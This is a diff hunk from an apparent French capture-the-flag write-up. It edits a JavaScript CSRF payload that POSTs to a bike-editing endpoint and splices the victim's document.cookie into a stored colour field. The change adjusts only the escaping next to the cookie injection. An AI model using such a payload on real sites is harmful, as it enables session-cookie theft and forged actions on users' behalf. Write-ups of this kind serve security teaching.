@@ -34,7 +34,7 @@ J'ai donc créé ma payload CSRF.
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "/?page=preview&action=editBike&id=341");
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-xhr.send("data=%5B%7B%22id%22%3A%22roue0%22%2C%22slot%22%3A0%2C%22colors%22%3A%5B%22%5C%22%3E%25"+document.cookie+"%23e53935%22%2C%22%23fb8c00%22%5D%7D%2C%7B%22id%22%3A%22roue0%22%2C%22slot%22%3A1%2C%22colors%22%3A%5B%22%231e88e5%22%2C%22%238e24aa%22%5D%7D%2C%7B%22id%22%3A%22guidon2%22%2C%22slot%22%3A2%2C%22colors%22%3A%5B%22%235bcffa%22%2C%22%23f5abb9%22%5D%7D%2C%7B%22id%22%3A%22selle1%22%2C%22slot%22%3A3%2C%22colors%22%3A%5B%22%2343a047%22%5D%7D%2C%7B%22id%22%3A%22cadre3%22%2C%22slot%22%3A4%2C%22colors%22%3A%5B%22%23fdd835%22%5D%7D%5D");
+xhr.send("data=%5B%7B%22id%22%3A%22roue0%22%2C%22slot%22%3A0%2C%22colors%22%3A%5B%22%22"+document.cookie+"%23e53935%22%2C%22%23fb8c00%22%5D%7D%2C%7B%22id%22%3A%22roue0%22%2C%22slot%22%3A1%2C%22colors%22%3A%5B%22%231e88e5%22%2C%22%238e24aa%22%5D%7D%2C%7B%22id%22%3A%22guidon2%22%2C%22slot%22%3A2%2C%22colors%22%3A%5B%22%235bcffa%22%2C%22%23f5abb9%22%5D%7D%2C%7B%22id%22%3A%22selle1%22%2C%22slot%22%3A3%2C%22colors%22%3A%5B%22%2343a047%22%5D%7D%2C%7B%22id%22%3A%22cadre3%22%2C%22slot%22%3A4%2C%22colors%22%3A%5B%22%23fdd835%22%5D%7D%5D");
 ```
 
 payload final : 
